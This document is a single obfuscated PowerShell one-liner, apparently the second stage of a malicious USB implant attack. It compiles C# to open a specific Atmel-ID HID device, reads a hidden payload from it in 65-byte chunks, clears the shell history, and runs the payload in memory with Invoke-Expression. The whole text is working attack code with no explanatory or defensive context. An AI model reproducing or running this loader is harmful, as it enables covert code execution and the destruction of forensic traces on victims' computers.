$c='using System;using System.IO;using Microsoft.Win32.SafeHandles;using System.Runtime.InteropServices;namespace n{public class w{[DllImport(%kernel32.dll%)] public static extern SafeFileHandle CreateFile(String fn,UInt32 da,Int32 sm,IntPtr sa,Int32 cd,uint fa,IntPtr tf);public static FileStream o(string fn){return new FileStream(CreateFile(fn,0XC0000000U,3,IntPtr.Zero,3,0x40000000,IntPtr.Zero),FileAccess.ReadWrite,9,true);}}}'.Replace('%',[char]34);Add-Type -TypeDefinition $c;$z=gwmi Win32_USBControllerDevice;foreach($y in $z){$w=[wmi]$y.Dependent;if($w.GetPropertyValue('DeviceID')-match('03EB&PID_2066')-and($w.GetPropertyValue('Service')-eq$null)){$h=([char]92+[char]92+'?'+[char]92+$w.GetPropertyValue('DeviceID').ToString().Replace([char]92,[char]35)+[char]35+'{4d1e55b2-f16f-11cf-88cb-001111000030}')}}$f=[n.w]::o($h);$g=$e=0;$s=New-Object IO.MemoryStream;do{$o=0;$b=New-Object Byte[](65);$f.Write($b,0,65);$r=$f.Read($b,0,65);if($b[1]-gt0){if($e-eq0){$e=($b[2]*256)+$b[3];$o=2}$s.Write($b,$o+2,$b[1]-$o);$g+=$b[1]-$o}}while($g-lt$e-or$e-eq0);clhy;IEx([Text.Encoding]::ASCII).GetString($s.ToArray())
